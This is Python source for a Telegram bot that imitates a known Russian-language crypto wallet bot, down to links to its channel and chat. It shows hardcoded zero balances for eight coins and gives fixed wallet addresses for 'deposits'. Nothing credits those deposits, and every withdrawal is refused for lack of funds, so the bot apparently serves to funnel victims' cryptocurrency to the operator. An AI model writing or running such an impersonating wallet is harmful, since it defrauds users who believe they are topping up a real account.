from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import callback_query, CallbackQuery
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils.callback_data import CallbackData
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from app import keyboard as kb
from app import database as db
from dotenv import load_dotenv
from aiogram.dispatcher.filters import Command
import os
import logging
import sqlite3
from aiogram.types import ParseMode
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
import html
import random
import string
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton


load_dotenv()
bot = Bot(os.getenv('TOKEN'))
storage = MemoryStorage()
dp = Dispatcher(bot=bot, storage=storage)


@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    await message.answer(f'<a href="https://t.me/CryptoBotRU/14">Мультивалютный криптокошелек</a>. Покупайте, продавайте, храните и платите криптовалютой когда хотите.\n\nПодписывайтесь на <a href="https://t.me/CryptoBotRU">наш канал</a> и вступайте в <a href="https://t.me/CryptoBotRussian">наш чат</a>.', reply_markup=kb.mainmenu, parse_mode='HTML', disable_web_page_preview=True)

@dp.callback_query_handler(text='wallet')
async def wallet(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''👛 <b>Кошелёк</b>

· <a href="https://tether.to/">Tether</a>: 0 USDT

· <a href="https://ton.org/">Toncoin</a>: 0 TON

· <a href="https://bitcoin.org/">Bitcoin</a>: 0 BTC

· <a href="https://litecoin.org/">Litecoin</a>: 0 LTC

· <a href="https://ethereum.org/">Ethereum</a>: 0 ETH

· <a href="https://binance.org/">Binance Coin</a>: 0 BNB

· <a href="https://tron.network/">Tron</a>: 0 TRX

· <a href="https://www.centre.io/usdc">USD Coin</a>: 0 USDC

≈ 0 BTC''', reply_markup=kb.walletmarkup, parse_mode='HTML', disable_web_page_preview=True)


@dp.callback_query_handler(text='addbal')
async def addbal(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id
    await bot.send_message(chat_id, 'Выберите криптовалюту для пополнения баланса.', reply_markup=kb.addbalwallet)


@dp.callback_query_handler(text='vivod')
async def vivod(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id
    await bot.send_message(chat_id, 'Выберите криптовалюту для отправки.', reply_markup=kb.selladdbalwallet)

@dp.callback_query_handler(text='nazad')
async def nazad(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text=f'<a href="https://t.me/CryptoBotRU/14">Мультивалютный криптокошелек</a>. Покупайте, продавайте, храните и платите криптовалютой когда хотите.\n\nПодписывайтесь на <a href="https://t.me/CryptoBotRU">наш канал</a> и вступайте в <a href="https://t.me/CryptoBotRussian">наш чат</a>.', reply_markup=kb.mainmenu, parse_mode='HTML', disable_web_page_preview=True)

@dp.callback_query_handler(text='notmoney')
async def notmoney(callback_query: types.CallbackQuery):
    await bot.send_message(chat_id=callback_query.message.chat.id, text='''😔 Недостаточно монет.

Минимум: 4 USDT ($4)
Комиссия: 3 USDT ($3).

Ваш баланс: 0 USDT''', disable_notification=False)

@dp.callback_query_handler(text='notmoneyeth')
async def notmoneyeth(callback_query: types.CallbackQuery):
    await bot.send_message(chat_id=callback_query.message.chat.id, text='''😔 Недостаточно монет.

Минимум: 6.51 USDT ($6.51)
Комиссия: 6.5 USDT ($6.50).

Ваш баланс: 0 USDT''', disable_notification=False)

@dp.callback_query_handler(text='notmoneybnb')
async def notmoneybnb(callback_query: types.CallbackQuery):
    await bot.send_message(chat_id=callback_query.message.chat.id, text='''😔 Недостаточно монет.

Минимум: 2.5 USDT ($2.50)
Комиссия: 1.5 USDT ($1.50).

Ваш баланс: 0 USDT''', disable_notification=False)

@dp.callback_query_handler(text='notmoneyton')
async def notmoneyton(callback_query: types.CallbackQuery):
    await bot.send_message(chat_id=callback_query.message.chat.id, text='''😔 Недостаточно монет.

Минимум: 0.1005 TON ($0.21)
Комиссия: 0.1 TON ($0.21).

Ваш баланс: 0 TON''', disable_notification=False)

@dp.callback_query_handler(text='notmoneybtc')
async def notmoneybtc(callback_query: types.CallbackQuery):
    await bot.send_message(chat_id=callback_query.message.chat.id, text='''😔 Недостаточно монет.

Минимум: 0.0013 BTC ($44.99)
Комиссия: 0.0003 BTC ($10.38).

Ваш баланс: 0 BTC''', disable_notification=False)

@dp.callback_query_handler(text='notmoneyltc')
async def notmoneyltc(callback_query: types.CallbackQuery):
    await bot.send_message(chat_id=callback_query.message.chat.id, text='''😔 Недостаточно монет.

Минимум: 0.015 LTC ($1.04)
Комиссия: 0.005 LTC ($0.35).

Ваш баланс: 0 LTC''', disable_notification=False)

@dp.callback_query_handler(text='notmoneyeth')
async def notmoneyeth(callback_query: types.CallbackQuery):
    await bot.send_message(chat_id=callback_query.message.chat.id, text='''😔 Недостаточно монет.

Минимум: 0.0035 ETH ($6.36)
Комиссия: 0.0025 ETH ($4.54).

Ваш баланс: 0 ETH''', disable_notification=False)

@dp.callback_query_handler(text='notmoneybnb')
async def notmoneybnb(callback_query: types.CallbackQuery):
    await bot.send_message(chat_id=callback_query.message.chat.id, text='''😔 Недостаточно монет.

Минимум: 0.0055 BNB ($1.25)
Комиссия: 0.0045 BNB ($1.03).

Ваш баланс: 0 BNB''', disable_notification=False)

@dp.callback_query_handler(text='notmoneytron')
async def notmoneytron(callback_query: types.CallbackQuery):
    await bot.send_message(chat_id=callback_query.message.chat.id, text='''😔 Недостаточно монет.

Минимум: 25 TRX ($2.38)
Комиссия: 5 TRX ($0.48).

Ваш баланс: 0 TRX''', disable_notification=False)

@dp.callback_query_handler(text='ethcoin')
async def notmoneytron(callback_query: types.CallbackQuery):
    await bot.send_message(chat_id=callback_query.message.chat.id, text='''😔 Недостаточно монет.

Минимум: 6.51 USDC ($6.51)
Комиссия: 6.5 USDC ($6.50).

Ваш баланс: 0 USDC''', disable_notification=False)

@dp.callback_query_handler(text='bnbcoin')
async def bnbcoin(callback_query: types.CallbackQuery):
    await bot.send_message(chat_id=callback_query.message.chat.id, text='''😔 Недостаточно монет.

Минимум: 1.51 USDC ($1.51)
Комиссия: 1.5 USDC ($1.50).

Ваш баланс: 0 USDC''', disable_notification=False)

@dp.callback_query_handler(text='vivodback')
async def vivodback(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='Выберите криптовалюту для отправки.', reply_markup=kb.selladdbalwallet)

@dp.callback_query_handler(text='selladdbal1')
async def selladdbal1(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='Выберите сеть для отправки USDT.', reply_markup=kb.selltether)

@dp.callback_query_handler(text='selladdbal2')
async def selladdbal2(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='Выберите сеть для отправки TON.', reply_markup=kb.sellton)

@dp.callback_query_handler(text='selladdbal3')
async def selladdbal3(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='Выберите сеть для отправки BTC.', reply_markup=kb.sellbtc)

@dp.callback_query_handler(text='selladdbal4')
async def selladdbal4(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='Выберите сеть для отправки LTC.', reply_markup=kb.sellltc)

@dp.callback_query_handler(text='selladdbal5')
async def selladdbal5(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='Выберите сеть для отправки ETH.', reply_markup=kb.selleth)

@dp.callback_query_handler(text='selladdbal6')
async def selladdbal6(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='Выберите сеть для отправки BNB.', reply_markup=kb.sellbnb)

@dp.callback_query_handler(text='selladdbal7')
async def selladdbal7(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='Выберите сеть для отправки TRX.', reply_markup=kb.selltron)

@dp.callback_query_handler(text='selladdbal8')
async def selladdbal8(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='Выберите сеть для отправки USDC.', reply_markup=kb.sellusdc)

@dp.callback_query_handler(text='commisia')
async def commisia(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='Выберите криптовалюту.', reply_markup=kb.comisiamarkup)


@dp.callback_query_handler(text='comisia1')
async def commisia1(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='Выберите сеть для USDT.', reply_markup=kb.tethermark)

@dp.callback_query_handler(text='troncom')
async def troncom(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Просмотр комиссий и лимитов для монеты <b>USDTM</b> в сети <b>TRON</b> – <b>TRC20.</b>

Комиссия на вывод: <b>3 USDT</b>

<b>Лимиты:</b>
Пополнение: <b>безлимит</b>
Вывод: от <b>1 USDT</b>''', reply_markup=kb.nazadcomark, parse_mode='HTML')

@dp.callback_query_handler(text='ethcom')
async def ethcom(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Просмотр комиссий и лимитов для монеты <b>USDT</b> в сети <b>Ethereum</b> – <b>ERC20.</b>

Комиссия на вывод: <b>6.5 USDT</b>

<b>Лимиты:</b>
Пополнение: <b>безлимит</b>
Вывод: от <b>0.01 USDT</b>''', reply_markup=kb.nazadcomark, parse_mode='HTML')

@dp.callback_query_handler(text='bnbcom')
async def bnbcom(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Просмотр комиссий и лимитов для монеты <b>USDT</b> в сети <b>BNB Smart Chain</b> – <b>BEP20.</b>

Комиссия на вывод: <b>1.5 USDT</b>

<b>Лимиты:</b>
Пополнение: <b>безлимит</b>
Вывод: от <b>1 USDT</b>''', reply_markup=kb.nazadcomark, parse_mode='HTML')

@dp.callback_query_handler(text='comisia2')
async def comisia2(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Просмотр комиссий и лимитов для монеты <b>TON</b> в сети <b>The Open Network</b> – <b>TON.</b>

Комиссия на вывод: <b>0.1 TON</b>

<b>Лимиты:</b>
Пополнение: <b>безлимит</b>
Вывод: от <b>0.0005 TON</b>''', reply_markup=kb.nazadcommark, parse_mode='HTML')

@dp.callback_query_handler(text='comisia3')
async def comisia3(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Просмотр комиссий и лимитов для монеты <b>BTC</b> в сети <b>Bitcoin</b> – <b>BTC.</b>

Комиссия на вывод: <b>0.0003 BTC</b>

<b>Лимиты:</b>
Пополнение: от <b>0.00002 BTC</b>
Вывод: от <b>0.001 BTC до 25 BTC</b>''', reply_markup=kb.nazadcommark, parse_mode='HTML')

@dp.callback_query_handler(text='comisia4')
async def comisia4(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Просмотр комиссий и лимитов для монеты <b>LTC</b> в сети <b>Litecoin</b> – <b>LTC.</b>

Комиссия на вывод: <b>0.005 LTC</b>

<b>Лимиты:</b>
Пополнение: от <b>0.0001 LTC</b>
Вывод: от <b>0.01 LTC до 3,000 LTC</b>''', reply_markup=kb.nazadcommark, parse_mode='HTML')


@dp.callback_query_handler(text='comisia5')
async def comisia6(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Просмотр комиссий и лимитов для монеты <b>ETH</b> в сети <b>Ethereum</b> – <b>ERC20.</b>

Комиссия на вывод: <b>0.0025 ETH</b>

<b>Лимиты:</b>
Пополнение: <b>безлимит</b>
Вывод: от <b>0.001 ETH</b>''', reply_markup=kb.nazadcommark, parse_mode='HTML')

@dp.callback_query_handler(text='comisia6')
async def comisia7(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Просмотр комиссий и лимитов для монеты <b>BNB</b> в сети <b>BNB Smart Chain</b> – <b>BEP20.</b>

Комиссия на вывод: <b>0.0045 BNB</b>

<b>Лимиты:</b>
Пополнение: <b>безлимит</b>
Вывод: от <b>0.001 BNB</b>''', reply_markup=kb.nazadcommark, parse_mode='HTML')

@dp.callback_query_handler(text='comisia7')
async def comisia7(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Просмотр комиссий и лимитов для монеты <b>BNB</b> в сети <b>BNB Smart Chain</b> – <b>BEP20.</b>

Комиссия на вывод: <b>0.0045 BNB</b>

<b>Лимиты:</b>
Пополнение: <b>безлимит</b>
Вывод: от <b>0.001 BNB</b>''', reply_markup=kb.nazadcommark, parse_mode='HTML')

@dp.callback_query_handler(text='comisia8')
async def comisia8(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Выберите сеть для USDC.''', reply_markup=kb.nextcommark)

@dp.callback_query_handler(text='ethereums')
async def comisia8(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Просмотр комиссий и лимитов для монеты <b>USDC</b> в сети <b>Ethereum</b> – <b>ERC20.</b>

Комиссия на вывод: <b>6.5 USDC</b>

<b>Лимиты:</b>
Пополнение: <b>безлимит</b>
Вывод: от <b>0.01 USDC</b>''', reply_markup=kb.nazadnextmark, parse_mode='HTML')

@dp.callback_query_handler(text='bnbsmartch')
async def comisia8(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Просмотр комиссий и лимитов для монеты <b>USDC</b> в сети <b>BNB Smart Chain – BEP20.</b>

Комиссия на вывод: <b>1.5 USDC</b>

<b>Лимиты:</b>
Пополнение: <b>безлимит</b>
Вывод: от <b>0.01 USDC</b>''', reply_markup=kb.nazadnextmark, parse_mode='HTML')

@dp.callback_query_handler(text='addbal1')
async def buy1(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Выберите сеть для пополнения баланса USDT.''', reply_markup=kb.buymark)

@dp.callback_query_handler(text='buytron')
async def buytron(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Используйте адрес ниже для пополнения баланса.

Монета: <b>USDT</b>
Сеть: <b>TRON – TRC20</b> ‼️

TTiGRxD3bvU3wvPEUxVUcwLELofHGqLdy9 

⚠️ Отправляйте только USDT через сеть TRON, иначе монеты будут утеряны.''', reply_markup=kb.backmark, parse_mode='HTML')

@dp.callback_query_handler(text='buyeth')
async def buytron(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Используйте адрес ниже для пополнения баланса.

Монета: <b>USDT</b>
Сеть: <b>Ethereum – ERC20</b> ‼️

0x075E9573d3A31ff6ca625215C0f2a1f7214d2740 

⚠️ Отправляйте только USDT через сеть Ethereum, иначе монеты будут утеряны.''', reply_markup=kb.backmark, parse_mode='HTML')

@dp.callback_query_handler(text='buybnb')
async def buytron(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Используйте адрес ниже для пополнения баланса.

Монета: <b>USDT</b>
Сеть: <b>BNB Smart Chain – BEP20</b> ‼️

0x6a215917DA14355d9791Df22C2d7cc308AC2f85a 

⚠️ Отправляйте только USDT через сеть BNB Smart Chain, иначе монеты будут утеряны.''', reply_markup=kb.backmark, parse_mode='HTML')

@dp.callback_query_handler(text='addbal2')
async def buytron(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Используйте адрес ниже для пополнения баланса.

Монета: <b>TON</b>
Сеть: <b>The Open Network – TON</b> ‼️

EQBnC_js0Lei8ovy89uSBuHMLjbylDqtegKrx7yPpn266qTW 

⚠️ Отправляйте только TON через сеть The Open Network, иначе монеты будут утеряны.''', reply_markup=kb.backmark, parse_mode='HTML')

@dp.callback_query_handler(text='addbal3')
async def buytron(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Используйте адрес ниже для пополнения баланса.

Монета: <b>BTC</b>
Сеть: <b>Bitcoin – BTC</b> ‼️

bc1q54lxqscz2crcn2wzrldkarquuwdfnqw0faejq9 

Мин. сумма пополнения: 0.00002 BTC

⚠️ Отправляйте только BTC через сеть Bitcoin, иначе монеты будут утеряны. Вы должны отправить не менее 0.00002 BTC или больше для внесения депозита.''', reply_markup=kb.backmark, parse_mode='HTML')

@dp.callback_query_handler(text='addbal4')
async def buytron(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Используйте адрес ниже для пополнения баланса.

Монета: <b>LTC</b>
Сеть: <b>Litecoin – LTC</b> ‼️

ltc1qxmnk32xn4j0hgde4mujnqmtwehn6xaalquwqp7 

Мин. сумма пополнения: 0.0001 LTC

⚠️ Отправляйте только LTC через сеть Litecoin, иначе монеты будут утеряны. Вы должны отправить не менее 0.0001 LTC или больше для внесения депозита.''', reply_markup=kb.backmark, parse_mode='HTML')

@dp.callback_query_handler(text='addbal5')
async def buytron(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Используйте адрес ниже для пополнения баланса.

Монета: <b>ETH</b>
Сеть: <b>Ethereum – ERC20</b> ‼️

0x075E9573d3A31ff6ca625215C0f2a1f7214d2740 

⚠️ Отправляйте только ETH через сеть Ethereum, иначе монеты будут утеряны.''', reply_markup=kb.backmark, parse_mode='HTML')

@dp.callback_query_handler(text='addbal6')
async def buytron(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Используйте адрес ниже для пополнения баланса.

Монета: <b>BNB</b>
Сеть: <b>BNB Smart Chain – BEP20</b> ‼️

0x6a215917DA14355d9791Df22C2d7cc308AC2f85a 

⚠️ Отправляйте только BNB через сеть BNB Smart Chain, иначе монеты будут утеряны.''', reply_markup=kb.backmark, parse_mode='HTML')

@dp.callback_query_handler(text='addbal7')
async def buytron(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Используйте адрес ниже для пополнения баланса.

Монета: <b>TRX</b>
Сеть: <b>TRON – TRC20</b> ‼️

TTiGRxD3bvU3wvPEUxVUcwLELofHGqLdy9 

Мин. сумма пополнения: 10 TRX

⚠️ Отправляйте только TRX через сеть TRON, иначе монеты будут утеряны. Вы должны отправить не менее 10 TRX или больше для внесения депозита.''', reply_markup=kb.backmark, parse_mode='HTML')

@dp.callback_query_handler(text='addbal8')
async def addbal8(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Выберите сеть для пополнения баланса USDC.''', reply_markup=kb.buynextcommark)

@dp.callback_query_handler(text='buyethereums')
async def buytron(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Используйте адрес ниже для пополнения баланса.

Монета: <b>USDC</b>
Сеть: <b>Ethereum – ERC20</b> ‼️

0x075E9573d3A31ff6ca625215C0f2a1f7214d2740 

⚠️ Отправляйте только USDC через сеть Ethereum, иначе монеты будут утеряны.''', reply_markup=kb.backmark, parse_mode='HTML')

@dp.callback_query_handler(text='buybnbsmartch')
async def buytron(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Используйте адрес ниже для пополнения баланса.

Монета: <b>USDC</b>
Сеть: <b>BNB Smart Chain – BEP20</b> ‼️

0x6a215917DA14355d9791Df22C2d7cc308AC2f85a 

⚠️ Отправляйте только USDC через сеть BNB Smart Chain, иначе монеты будут утеряны.''', reply_markup=kb.backmark, parse_mode='HTML')

@dp.callback_query_handler(text='editmonet')
async def editmonet(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(text='''Выберите криптовалюту для пополнения баланса.''', reply_markup=kb.addbalwallet, parse_mode='HTML')

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)